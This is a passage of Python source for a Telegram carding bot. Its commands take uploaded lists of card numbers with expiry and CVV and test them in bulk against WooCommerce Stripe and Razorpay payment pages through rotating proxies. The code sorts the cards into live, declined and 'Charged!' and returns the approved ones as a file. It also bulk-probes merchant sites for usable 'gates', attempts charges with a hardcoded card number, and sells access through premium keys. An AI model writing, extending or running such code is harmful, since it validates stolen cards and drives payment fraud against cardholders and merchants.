            async def _stxt_sem_check(c, s, p, pl, uid):
                async with get_user_semaphore(uid):
                    return await asyncio.get_running_loop().run_in_executor(
                        CHECKER_POOL, lambda: st.VW(c, s, p, proxy_list=pl))

            for cc in batch:
                if _STXT_STOP_FLAGS.get(stop_key):
                    break
                proxy_data = random.choice(proxy_list) if proxy_list else None
                proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None
                _cc, _site, _px, _pxl = cc, site_url, proxy_url, _px_urls
                tasks.append(_stxt_sem_check(_cc, _site, _px, _pxl, user_id))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for idx, result in enumerate(results):
                cc = batch[idx] if idx < len(batch) else "?"
                checked += 1
                result_str = str(result).strip() if not isinstance(result, Exception) else str(result)[:80]

                ml = result_str.lower()
                if "card added" in ml:
                    approved += 1
                    approved_ccs.append(cc)
                    try:
                        await bot.send_message(
                            chat_id,
                            f"{pe(E['gem'])} {bold('Card Added!')}\n\n"
                            f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                            f"{pe(R['gate'])} {bold('Response:')} {bold(result_str)}\n\n"
                            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
                        )
                    except Exception:
                        pass
                elif any(k in ml for k in ["3d requires_action", "requires_action", "insufficient", "incorrect_cvc", "invalid_cvc"]):
                    try:
                        appr_text = (
                            f"{_st_status_line(result_str)}\n\n"
                            f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                            f"{pe(R['gate'])} {bold('Gate:')} {bold('WooCommerce Stripe')}\n"
                            f"{pe(R['gate'])} {bold('Response:')} {bold(result_str)}\n\n"
                            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                        )
                        await _send_approved(appr_text)
                    except Exception:
                        pass
                elif "declined" in ml:
                    declined += 1

            _now = time.time()
            elapsed = round(_now - _start_time, 1)
            if _now - _last_status_edit >= 2.5 or checked >= total:
                _last_status_edit = _now
                try:
                    await safe_edit(status_msg, 
                        f"{pe(E['rocket'])} {bold('ST File Check')}\n\n"
                        f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(checked))}/{bold(str(total))}\n"
                        f"{pe(E['check'])} {bold('Card Added:')} {bold(str(approved))}\n"
                        f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                        f"{pe(E['hourglass'])} {bold('Time:')} {bold(str(elapsed))}s\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
                        reply_markup={
                            "inline_keyboard": [[{
                                "text": f"{bold('Stop Checking')}",
                                "callback_data": f"stxt_stop:{stop_key}",
                            }]]
                        },
                    )
                except Exception:
                    pass

        elapsed = round(time.time() - _start_time, 1)
        try:
            await safe_edit(status_msg, 
                f"{pe(E['check'])} {bold('ST File Check Complete!')}\n\n"
                f"{pe(E['bolt'])} {bold('Total:')} {bold(str(checked))}/{bold(str(total))}\n"
                f"{pe(E['check'])} {bold('Card Added:')} {bold(str(approved))}\n"
                f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                f"{pe(E['hourglass'])} {bold('Time:')} {bold(str(elapsed))}s\n\n"
                f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
            )
        except Exception:
            pass

        if approved_ccs:
            from io import BytesIO
            txt = "\n".join(approved_ccs)
            buf = BytesIO(txt.encode("utf-8"))
            buf.name = "approved.txt"
            try:
                await bot.send_document(
                    chat_id,
                    types.BufferedInputFile(buf.getvalue(), filename="approved.txt"),
                    caption=(
                        f"{pe(E['gem'])} {bold('Approved CCs')} ({bold(str(len(approved_ccs)))})\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    ),
                )
            except Exception:
                pass

    finally:
        _STXT_ACTIVE_USERS.discard(user_id)
        _STXT_STOP_FLAGS.pop(stop_key, None)


@router.message(Command("stxt"))
async def cmd_stxt(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /stxt\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return

    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(f"{pe(E['cross'])} {bold('Only .txt files are supported!')}")
        return

    site_url = get_user_stsite(user_id)
    if not site_url:
        await message.reply(
            f"{pe(E['cross'])} {bold('No ST site set!')}\n\n"
            f"{pe(E['next'])} {bold('Use /sadd example.com first.')}"
        )
        return

    proxy_list = get_user_proxies(user_id)

    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to download file!')}")
        return

    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}")
        return

    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} {bold(str(cc_limit))} {bold('CCs max.')}\n"
            f"{pe(E['next'])} {bold('Extra CCs skipped.')}"
        )

    if user_id in _STXT_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your ST file check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap Stop first.')}"
        )
        return

    stop_key = f"stxt:{message.chat.id}:{user_id}"
    _STXT_STOP_FLAGS[stop_key] = False
    _STXT_ACTIVE_USERS.add(user_id)

    total = len(all_ccs)
    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""

    status_msg = await message.reply(
        f"{pe(E['rocket'])} {bold('ST File Check Started!')}\n\n"
        f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
        f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(STXT_BATCH_SIZE))}\n"
        f"{pe(E['refresh'])} {bold('Random proxy per CC')}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
        reply_markup={
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"stxt_stop:{stop_key}",
            }]]
        },
    )

    await _process_stxt_cards(all_ccs, user_id, user_name, user_uname, message.chat.id, status_msg, stop_key, site_url)


@router.callback_query(F.data.startswith("stxt_stop:"))
async def cb_stxt_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    parts = stop_key.split(":")
    if len(parts) >= 3:
        owner_id = int(parts[2])
    else:
        owner_id = 0

    if callback.from_user.id != owner_id and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Only the owner can stop this!"), show_alert=True)
        return

    _STXT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping ST file check..."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  /stest — Bulk test WooCommerce sites (max 25, batch all at once)
# ══════════════════════════════════════════════════════════════════════════════

STEST_MAX = 25
_STEST_EDIT_LOCKS: dict[int, asyncio.Lock] = {}


async def _stest_single(
    site: str, proxy_list: list,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    proxy_data = random.choice(proxy_list) if proxy_list else None
    proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None
    _px_urls = [_proxy_dict_to_url(p) for p in proxy_list if _proxy_dict_to_url(p)] if proxy_list else []

    try:
        result_str = await asyncio.get_running_loop().run_in_executor(
            CHECKER_POOL, lambda: st.VW(_ST_TEST_CC, site, proxy_url, proxy_list=_px_urls),
        )
    except Exception as e:
        result_str = str(e)[:80]

    result_str = str(result_str).strip()
    working = _st_is_working_response(result_str)
    results[site] = {"msg": result_str, "working": working}

    msg_id = status_msg.message_id
    if msg_id not in _STEST_EDIT_LOCKS:
        _STEST_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _STEST_EDIT_LOCKS[msg_id]:
        done = sum(1 for s in order if s in results)
        total = len(order)
        ok = sum(1 for s in order if s in results and results[s]["working"])
        fail = done - ok

        lines = [
            f"{pe(E['rocket'])} {bold('Site Tester')} [{bold(str(done))}/{bold(str(total))}]\n"
        ]

        for s in order:
            if s in results:
                r = results[s]
                if r["working"]:
                    lines.append(f"{pe(E['check'])} {bold(s)} — {bold(r['msg'])}")
                else:
                    lines.append(f"{pe(E['cross'])} {bold(s)} — {bold(r['msg'][:50])}")
            else:
                lines.append(f"{pe(E['loading'])} {bold(s)} {bold('testing...')}")

        lines.append(
            f"\n{pe(E['check'])} {bold('Working:')} {bold(str(ok))} | "
            f"{pe(E['cross'])} {bold('Failed:')} {bold(str(fail))}"
        )
        lines.append(f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if done == total:
        _STEST_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("stest"))
async def cmd_stest(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /stest site1.com\n"
            f"site2.com\n"
            f"site3.com\n\n"
            f"{pe(E['bolt'])} {bold('Max')} {bold(str(STEST_MAX))} {bold('sites per test.')}"
        )
        return

    sites: list[str] = []
    for line in raw_text.strip().splitlines():
        s = line.strip().replace("https://", "").replace("http://", "").strip("/")
        if s and "." in s and s not in sites:
            sites.append(s)

    if not sites:
        await message.reply(f"{pe(E['cross'])} {bold('No valid sites found!')}")
        return

    if len(sites) > STEST_MAX:
        sites = sites[:STEST_MAX]

    proxy_list = get_user_proxies(user_id)
    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(sites)

    init_lines = [f"{pe(E['rocket'])} {bold('Site Tester')} [{bold('0')}/{bold(str(total))}]\n"]
    for s in sites:
        init_lines.append(f"{pe(E['loading'])} {bold(s)} {bold('testing...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(sites)

    tasks = [
        asyncio.create_task(
            _stest_single(s, proxy_list, status_msg, results, order, user_name, user_uname, user_id)
        )
        for s in sites
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    working = [s for s in order if s in results and results[s]["working"]]
    if working:
        from io import BytesIO
        txt = "\n".join(working)
        try:
            await bot.send_document(
                message.chat.id,
                types.BufferedInputFile(txt.encode("utf-8"), filename="working_sites.txt"),
                caption=(
                    f"{pe(E['check'])} {bold('Working Sites')} ({bold(str(len(working)))})\n\n"
                    f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                ),
            )
        except Exception:
            pass
        try:
            _site_lines = "\n".join(f"{pe(E['globe'])} {bold(s)}" for s in working)
            await bot.send_message(
                auth.APPROVED_GROUP_ID,
                f"{pe(E['check'])} {bold('ST Working Sites')} ({bold(str(len(working)))})\n\n"
                f"{pe(R['checked_by'])} {bold('User:')} {user_link(user_id, user_name, user_uname)}\n\n"
                f"{_site_lines}",
                disable_notification=True,
            )
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  ZEN / GameSeal — DISABLED
# ══════════════════════════════════════════════════════════════════════════════
# /z, /mz, /ztxt commands commented out — uncomment gameseal_auto import to re-enable


# ══════════════════════════════════════════════════════════════════════════════
#  RAZORPAY site storage (rzsite.json)
# ══════════════════════════════════════════════════════════════════════════════

_rzsite_cache: dict | None = None
_rzsite_cache_mtime: float = 0.0
RZSITE_MAX = 25  # max Razorpay sites per user

def _load_rzsites() -> dict:
    global _rzsite_cache, _rzsite_cache_mtime
    try:
        mt = os.path.getmtime(RZSITE_FILE)
    except OSError:
        return {}
    if _rzsite_cache is not None and mt == _rzsite_cache_mtime:
        return _rzsite_cache
    try:
        with open(RZSITE_FILE, "r", encoding="utf-8") as f:
            _rzsite_cache = json.load(f)
            _rzsite_cache_mtime = mt
            return _rzsite_cache
    except Exception:
        return {}

def _save_rzsites(data: dict):
    global _rzsite_cache, _rzsite_cache_mtime
    with open(RZSITE_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _rzsite_cache = data
    try:
        _rzsite_cache_mtime = os.path.getmtime(RZSITE_FILE)
    except OSError:
        _rzsite_cache_mtime = 0.0

def _normalize_rzsite_url(url: str) -> str:
    return rz.normalize_pages_url(url.strip())

def _coerce_rzsite_list(val) -> list[str]:
    """Backward-compat: old entries could be plain string or dict."""
    if isinstance(val, list):
        out = []
        for v in val:
            if isinstance(v, dict):
                v = v.get("url") or v.get("site") or ""
            if v and isinstance(v, str):
                out.append(rz.normalize_pages_url(v))
        return out
    if isinstance(val, dict):
        v = val.get("url") or val.get("site") or ""
        return [rz.normalize_pages_url(v)] if v else []
    if isinstance(val, str) and val:
        return [rz.normalize_pages_url(val)]
    return []

def get_user_rzsites(user_id: int) -> list[str]:
    """Return all saved Razorpay sites for a user."""
    return _coerce_rzsite_list(_load_rzsites().get(str(user_id)))

def get_user_rzsite(user_id: int) -> str | None:
    """Return a random Razorpay site from the user's list, or None."""
    sites = get_user_rzsites(user_id)
    return random.choice(sites) if sites else None

def add_user_rzsite(user_id: int, url: str) -> str:
    """Add a Razorpay site. Returns 'added', 'duplicate', or 'limit'."""
    url = _normalize_rzsite_url(url)
    data = _load_rzsites()
    sites = _coerce_rzsite_list(data.get(str(user_id)))
    if url in sites:
        return "duplicate"
    if len(sites) >= RZSITE_MAX:
        return "limit"
    sites.append(url)
    data[str(user_id)] = sites
    _save_rzsites(data)
    return "added"

def set_user_rzsite(user_id: int, url: str):
    """Legacy alias — adds url to list (called by /rzsite after site test)."""
    add_user_rzsite(user_id, url)

def del_user_rzsite(user_id: int, index: int | None = None):
    """Remove site by 1-based index, or all sites if index is None."""
    data = _load_rzsites()
    key = str(user_id)
    sites = _coerce_rzsite_list(data.get(key))
    if index is None:
        data.pop(key, None)
    else:
        if 1 <= index <= len(sites):
            sites.pop(index - 1)
            if sites:
                data[key] = sites
            else:
                data.pop(key, None)
    _save_rzsites(data)

_RZ_TEST_CC = "4833120203826863|06|2030|288"

_RZ_NOT_INTERNATIONAL = (
    "not supported", "card type not supported", "not enabled",
    "not accepted", "international", "domestic",
)

_RZ_CONNECTION_ERRORS = (
    "page_fetch_failed", "page_error", "connection", "timeout",
    "timed out", "ssl", "unreachable", "could not resolve",
    "proxy ip blocked", "proxy authentication failed", "407", "403 forbidden",
    "proxy", "network",
)


# ══════════════════════════════════════════════════════════════════════════════
#  RAZORPAY helpers
# ══════════════════════════════════════════════════════════════════════════════

def _rz_price(dbg: dict) -> str:
    paise = dbg.get("amount_paise")
    currency = dbg.get("currency", "INR")
    if paise is not None:
        return f"{int(paise) / 100:.2f} {currency}"
    return "-"


_RZ_PROXY_CODES = ("proxy_blocked", "proxy_auth_fail", "proxy_error")


def _rz_is_proxy_error(code: str, msg: str) -> bool:
    if code in _RZ_PROXY_CODES:
        return True
    ml = msg.lower()
    return "proxy" in ml and ("blocked" in ml or "auth" in ml or "407" in ml or "403" in ml)


def _rz_status_line(status: str, msg: str, code: str) -> str:
    ml = msg.lower()
    if _rz_is_proxy_error(code, msg):
        return f"{pe(E['cross'])} {bold('Proxy Error')}"
    if status == "live":
        if code == "charged" or "captured" in ml or "authorized" in ml:
            return f"{pe(E['gem'])} {bold('Charged!')}"
        if code == "ccn" or "cvv" in ml or "cvc" in ml:
            return f"{pe(E['check3'])} {bold('CCN — Incorrect CVC')}"
        if code == "live_limit" or "insufficient" in ml:
            return f"{pe(E['check2'])} {bold('Insufficient Funds — Live')}"
        return f"{pe(E['check'])} {bold('Live')}"
    if status == "dead":
        if "3ds" in code or "3ds" in ml or "otp" in ml:
            return f"{pe(E['check'])} {bold('3DS / OTP — Live')}"
        if "expired" in ml:
            return f"{pe(E['cross2'])} {bold('Card Expired')}"
        return f"{pe(E['cross'])} {bold('Declined')}"
    return f"{pe(E['warn2'])} {bold(msg[:60])}"


def _rz_is_working(status: str, code: str, msg: str) -> bool:
    if status == "live":
        return True
    if status == "dead" and code in ("declined", "declined_other", "3ds_required", "3ds_no_detail", "3ds_cancel_fail"):
        return True
    return False


RZ_CHECK_TIMEOUT = 90


async def _rz_execute(
    cc_str: str, site_url: str, proxy_list: list,
) -> tuple[str, str, str, dict]:
    """Run RZ check in thread pool with hard timeout so UI never hangs on 'Checking CC'."""
    loop = asyncio.get_running_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(
                CHECKER_POOL,
                lambda: _rz_run_check(cc_str, site_url, proxy_list, max_retries=1),
            ),
            timeout=RZ_CHECK_TIMEOUT,
        )
    except asyncio.TimeoutError:
        return "unknown", "Check timed out — proxy slow or site unreachable", "timeout", {}


def _rz_run_check(cc_str: str, site_url: str, proxy_list: list, max_retries: int = 2) -> tuple[str, str, str, dict]:
    parts = cc_str.split("|")
    if len(parts) < 4:
        return "unknown", "Invalid CC format", "bad_format", {}
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy

    site_url = rz.normalize_pages_url(site_url)
    if not proxy_list:
        return "unknown", "No proxy set — use /proxy first", "proxy_error", {}

    last_status, last_msg, last_code, last_dbg = "unknown", "all retries failed", "failed", {}
    tried_proxies = set()

    for attempt in range(max_retries + 1):
        available = [p for p in proxy_list if id(p) not in tried_proxies]
        if not available:
            available = proxy_list
        proxy_data = random.choice(available) if available else None
        if proxy_data:
            tried_proxies.add(id(proxy_data))
        proxy_url = None
        if proxy_data:
            proxy_url = proxy_data.get("proxy_url") or _proxy_dict_to_url(proxy_data)
        if not proxy_url:
            last_msg, last_code = "Invalid proxy in proxy.json", "proxy_error"
            continue

        try:
            status, msg, code, dbg = rz.charge_payment_page_card(
                site_url, cc, mm, yy, cvv, proxy_url=proxy_url, timeout=40.0,
            )
        except Exception as e:
            last_msg = str(e)[:80]
            last_code = "exception"
            continue

        last_status, last_msg, last_code, last_dbg = status, msg, code, dbg

        is_conn_err = any(k in msg.lower() for k in _RZ_CONNECTION_ERRORS)
        if is_conn_err and attempt < max_retries:
            continue
        return status, msg, code, dbg

    return last_status, last_msg, last_code, last_dbg


# ══════════════════════════════════════════════════════════════════════════════
#  /rzsite — Add / test Razorpay payment page
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("rzsite"))
async def cmd_rzsite(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip():
        sites = get_user_rzsites(user_id)
        usage = (
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /rzsite {bold('pages.razorpay.com/...')}\n\n"
            f"{pe(E['bolt'])} {bold('Adds a Razorpay site for /rz /mrz /rztxt (max 25)')}\n"
            f"{pe(E['star'])} {bold('A random site is picked each check.')}\n"
            f"{pe(E['globe'])} {bold('Only international sites accepted.')}\n"
            f"{pe(E['cross'])} {bold('Remove:')} /rzrem {bold('N')} {bold('or /rzrem all')}"
        )
        if sites:
            numbered = "\n".join(f"{pe(E['next'])} {bold(str(i+1)+'.')} {bold(s)}" for i, s in enumerate(sites))
            usage += f"\n\n{pe(E['check'])} {bold(f'Your sites ({len(sites)}/25):')}\n{numbered}"
        await message.reply(usage)
        return

    raw_url = _normalize_rzsite_url(args[1].strip())

    sites = get_user_rzsites(user_id)
    if len(sites) >= RZSITE_MAX:
        await message.reply(
            f"{pe(E['cross'])} {bold('Site limit reached! (25/25)')}\n\n"
            f"{pe(E['next'])} {bold('Remove one first:')} /rzrem {bold('N')}"
        )
        return
    if raw_url in sites:
        await message.reply(
            f"{pe(E['warn'])} {bold('Site already in your list!')}\n\n"
            f"{pe(E['globe'])} {bold(raw_url)}"
        )
        return

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Testing site...')}\n\n"
        f"{pe(R['cc'])} {bold('Test CC:')} <tg-spoiler>{_RZ_TEST_CC}</tg-spoiler>\n"
        f"{pe(E['hourglass'])} {bold('Waiting for response...')}"
    )

    try:
        status, msg, code, dbg = await _rz_execute(_RZ_TEST_CC, raw_url, proxy_list)
    except Exception as e:
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Site test failed!')}\n\n"
            f"{pe(E['warn'])} {bold(str(e)[:100])}"
        )
        return

    if any(k in msg.lower() for k in _RZ_NOT_INTERNATIONAL):
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Site is NOT international!')}\n\n"
            f"{pe(E['warn'])} {bold('Response:')} {bold(msg[:100])}\n\n"
            f"{pe(E['globe'])} {bold('Only international Razorpay pages are supported.')}\n"
            f"{pe(E['next'])} {bold('Add an international site instead.')}"
        )
        return

    if _rz_is_proxy_error(code, msg):
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Proxy Error!')}\n\n"
            f"{pe(E['warn'])} {bold('Error:')} {bold(msg)}\n\n"
            f"{pe(E['next'])} {bold('Your proxy IPs are blocked or rejected by Razorpay.')}\n"
            f"{pe(E['bolt'])} {bold('Fix: Use residential or mobile proxies.')}\n"
            f"{pe(E['next'])} {bold('Update proxies with')} /proxy"
        )
    elif _rz_is_working(status, code, msg):
        add_user_rzsite(user_id, raw_url)
        new_count = len(get_user_rzsites(user_id))
        await safe_edit(loading_msg, 
            f"{pe(E['check'])} {bold('Site added successfully!')}\n\n"
            f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:100])}\n"
            f"{pe(E['star'])} {bold(f'Total sites: {new_count}/25')}\n\n"
            f"{pe(E['bolt'])} {bold('You can now use /rz /mrz /rztxt')}"
        )
        try:
            await bot.send_message(
                auth.APPROVED_GROUP_ID,
                f"{pe(E['check'])} {bold('RZ Site Saved!')}\n\n"
                f"{pe(R['checked_by'])} {bold('User:')} {user_link(user_id, message.from_user.full_name, message.from_user.username or '')}\n"
                f"{pe(E['globe'])} {bold('Site:')} {bold(raw_url)}\n"
                f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:100])}",
                disable_notification=True,
            )
        except Exception:
            pass
    else:
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Site not working!')}\n\n"
            f"{pe(E['warn'])} {bold('Response:')} {bold(msg[:100])}\n\n"
            f"{pe(E['next'])} {bold('Site must return a card response to be valid.')}"
        )


# ── /rzrem — Remove Razorpay site(s) ─────────────────────────────────────────

@router.message(Command("rzrem"))
async def cmd_rzrem(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    sites = get_user_rzsites(user_id)
    if not sites:
        await message.reply(f"{pe(E['warn'])} {bold('No RZ sites saved! Use /rzsite to add one.')}")
        return

    args = message.text.split(maxsplit=1)
    arg = args[1].strip() if len(args) > 1 else ""

    if not arg:
        numbered = "\n".join(f"{pe(E['next'])} {bold(str(i+1)+'.')} {bold(s)}" for i, s in enumerate(sites))
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /rzrem {bold('1')} — {bold('remove site #1')}\n"
            f"{pe(E['next'])} /rzrem {bold('all')} — {bold('remove all sites')}\n\n"
            f"{pe(E['check'])} {bold(f'Your sites ({len(sites)}/25):')}\n{numbered}"
        )
        return

    if arg.lower() == "all":
        del_user_rzsite(user_id)
        await message.reply(f"{pe(E['check'])} {bold('All RZ sites removed!')}")
        return

    try:
        idx = int(arg)
    except ValueError:
        await message.reply(f"{pe(E['warn'])} {bold('Use a number: /rzrem 1')} or {bold('/rzrem all')}")
        return

    if idx < 1 or idx > len(sites):
        await message.reply(f"{pe(E['warn'])} {bold(f'Invalid number. You have {len(sites)} site(s).')}")
        return

    removed = sites[idx - 1]
    del_user_rzsite(user_id, idx)
    await message.reply(
        f"{pe(E['check'])} {bold('RZ site removed!')}\n\n"
        f"{pe(E['globe'])} {bold(removed)}"
    )


# ── /rzmysite — View saved Razorpay sites ────────────────────────────────────

@router.message(Command("rzmysite"))
async def cmd_rzmysite(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    sites = get_user_rzsites(user_id)
    if not sites:
        await message.reply(
            f"{pe(E['warn'])} {bold('No RZ sites saved!')}\n\n"
            f"{pe(E['next'])} {bold('Use /rzsite pages.razorpay.com/... to add one.')}"
        )
        return

    numbered = "\n".join(
        f"{pe(E['next'])} {bold(str(i+1)+'.')} {bold(s)}"
        for i, s in enumerate(sites)
    )
    await message.reply(
        f"{pe(E['check'])} {bold(f'Your RZ Sites ({len(sites)}/25):')}\n\n"
        f"{numbered}\n\n"
        f"{pe(E['bolt'])} {bold('Commands:')} /rz /mrz /rztxt {bold('(random site each run)')}\n"
        f"{pe(E['cross'])} {bold('Remove:')} /rzrem {bold('N')} {bold('or /rzrem all')}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /rztest — Bulk test Razorpay sites (max 25)
# ══════════════════════════════════════════════════════════════════════════════

RZTEST_MAX = 25
_RZTEST_EDIT_LOCKS: dict[int, asyncio.Lock] = {}


async def _rztest_single(
    site: str, proxy_list: list,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    try:
        status, msg, code, dbg = await _rz_execute(_RZ_TEST_CC, site, proxy_list)
    except Exception as e:
        status, msg, code, dbg = "unknown", str(e)[:80], "exception", {}

    not_intl = any(k in msg.lower() for k in _RZ_NOT_INTERNATIONAL)
    working = _rz_is_working(status, code, msg) and not not_intl
    results[site] = {"msg": msg, "working": working, "not_intl": not_intl}

    msg_id = status_msg.message_id
    if msg_id not in _RZTEST_EDIT_LOCKS:
        _RZTEST_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _RZTEST_EDIT_LOCKS[msg_id]:
        done = sum(1 for s in order if s in results)
        total = len(order)
        ok = sum(1 for s in order if s in results and results[s]["working"])
        fail = done - ok

        lines = [f"{pe(E['rocket'])} {bold('RZ Site Tester')} [{bold(str(done))}/{bold(str(total))}]\n"]

        for s in order:
            if s in results:
                r = results[s]
                if r["not_intl"]:
                    lines.append(f"{pe(E['warn'])} {bold(s)} — {bold('Not International')}")
                elif r["working"]:
                    lines.append(f"{pe(E['check'])} {bold(s)} — {bold(r['msg'][:50])}")
                else:
                    lines.append(f"{pe(E['cross'])} {bold(s)} — {bold(r['msg'][:50])}")
            else:
                lines.append(f"{pe(E['loading'])} {bold(s)} {bold('testing...')}")

        lines.append(
            f"\n{pe(E['check'])} {bold('Working:')} {bold(str(ok))} | "
            f"{pe(E['cross'])} {bold('Failed:')} {bold(str(fail))}"
        )
        lines.append(f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if done == total:
